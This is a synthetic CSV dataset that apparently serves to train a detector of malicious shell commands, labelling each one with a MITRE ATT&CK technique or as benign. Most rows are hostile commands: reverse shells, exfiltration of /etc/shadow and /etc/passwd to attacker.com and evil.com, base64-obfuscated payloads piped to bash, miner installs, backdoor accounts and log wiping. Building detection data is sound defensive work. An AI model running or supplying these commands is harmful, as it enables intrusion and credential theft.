command,features,label,source
time powershell.exe -EncodedCommand JABzA...,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time groups,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
"time python3 -c 'import socket,subprocess,os;...'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
sudo cat /etc/network/interfaces,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
"bash -c ""passwd -d root | sleep 1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""find / -writable -type d 2>/dev/null""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
time sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
sudo wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
"nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
(crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
"bash -c ""nmap -A -T4 192.168.1.0/24 ; history -c""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.36, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'c2ggLWMgJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo '' > /var/log/syslog && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup ssh user@192.168.1.10 'ls' &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
cat  /etc/resolv.conf,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
getent group sudo,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
env | grep PATH,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['BENIGN'],synthetic
cat ~/.ssh/id_rsa,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
curl  -s  http://c2.attacker.com/beacon  ;  chmod  +x  /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive && echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""powershell.exe -EncodedCommand JABzA... && echo done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""echo 'Y2VydHV0aWwuZXhlIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovL2F0dGFja2VyLmNvbS9uYy5leGUgbmMuZXhl' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""find / -name '*.conf' -readable 2>/dev/null | head -20""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
nohup powershell.exe -EncodedCommand JABzA... && chmod +x /tmp/payload &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/ | sleep 1""","[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find /home -name '.env' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
"sudo nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1 | > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'ZmluZCAvIC1uYW1lICdpZF9yc2EnIDI+L2Rldi9udWxs' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
passwd -d root | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo 'cHJvY2R1bXAuZXhlIC1tYSBsc2Fzcy5leGUgbHNhc3MuZG1w' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'ZWNobyAnYmFja2Rvb3I6eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dkIHwgZWNobyBkb25l'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo  'ZWNobyAnY29tcHJvbWlzZWQgQUxMPShBTEwpIE5PUEFTU1dEOkFMTCcgPj4gL2V0Yy9zdWRvZXJzICYmIHNsZWVwIDE='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
cat ~/.ssh/id_rsa,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
net localgroup administrators | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 1]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup wget http://attacker.com/payload -O /tmp/payload &,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
ssh -L 8080:internal:80 user@jump.host | echo done,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find / -perm -4000 -type f 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
usermod  -aG  sudo  compromised_user,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
nohup ./pwnkit ; sleep 1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1087_Account_Discovery'],synthetic
"bash -c ""sh -c 'curl http://evil.com/shell.sh | bash'""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'bm1jbGkgY29ubmVjdGlvbiBzaG93IHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
locate  wp-config.php,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
ip link show && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'Z3JvdXBz' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
df -h,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'ZmluZCAvIC1wZXJtIC00MDAwIC10eXBlIGYgMj4vZGV2L251bGwgJiYgc2xlZXAgMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
passwd -d root | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
crontab  -e,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1053_Scheduled_Task'],synthetic
echo 'Y3VybCAtWCBQT1NUIGh0dHA6Ly9ldmlsLmNvbS9jb2xsZWN0IC1kIEAvZXRjL3NoYWRvdyA7ID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo -u www-data bash | echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'd2dldCAtcSBodHRwOi8vbWluZXIuY29tL3htcmlnIC1PIC90bXAveG1yICYmIGNobW9kICt4IC90bXAveG1yICYmIC90bXAveG1yIC1vIHBvb2wubWluZXhtci5jb206NDQz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow ; > /dev/null 2>&1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""id -u && sleep 1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"ldapsearch  -x  -b  'dc=domain,dc=com'  '(objectClass=person)'  &&  echo  done","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ifconfig -a && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bWFzc2NhbiAtcDEtNjU1MzUgMTAuMC4wLjAvMjQgLS1yYXRlPTEwMDA=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
python3 exploit.py --target localhost ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
sudo echo 'bHMgLWxhIC9yb290IC9ldGMgL3Zhci93d3cgfCBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cnVudXNlciAtbCBwb3N0Z3JlcyAtYyAncHNxbCAtYyAiU0VMRUNUIHBnX3JlYWRfZmlsZShcJy9ldGMvcGFzc3dkXCcpIicgOyBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/shadow && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'cGVybCAtZSAndXNlIFNvY2tldDsgLi4uJw==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
net user /add attacker P@ssw0rd && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""python3 -c 'print(1+1)'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
time masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
lsb_release -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
"bash -c ""smbclient //10.0.0.5/C$ -U Administrator""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1021_Remote_Services'],synthetic
procdump.exe -ma lsass.exe lsass.dmp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
id  -u,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
useradd -m -s /bin/bash hacker ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
python3  exploit.py  --target  localhost  &&  chmod  +x  /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""python3 -c ""import subprocess; subprocess.run(['cat','/etc/shadow'])""""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
nohup  ./xmrig  --url  stratum+tcp://pool.minexmr.com:443  --user  wallet  &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
sudo echo 'bWFzc2NhbiAtcDEtNjU1MzUgMTAuMC4wLjAvMjQgLS1yYXRlPTEwMDA=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443 &,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.6, 1, 1]",['T1496_Resource_Hijacking'],synthetic
du -sh /var/log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
ifconfig -a ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'c2NwIGF0dGFja2VyQDEwLjAuMC45OTovdG9vbHMvbGlucGVhcy5zaCAvdG1wLw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
time cat /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'Y2F0IC9ldGMvZ3JvdXAgOyBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time nbtscan 192.168.1.0/24 | chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 1]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
at now + 1 minute <<< '/tmp/payload',"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1053_Scheduled_Task'],synthetic
medusa  -h  10.0.0.1  -u  root  -P  /tmp/passwords.txt  -M  ssh  &&  echo  done,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
last -n 10 && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
nohup  ./xmrig  --url  stratum+tcp://pool.minexmr.com:443  --user  wallet  &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
sudo net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
sudo psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
sed  -i  's/old/new/g'  config.cfg,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
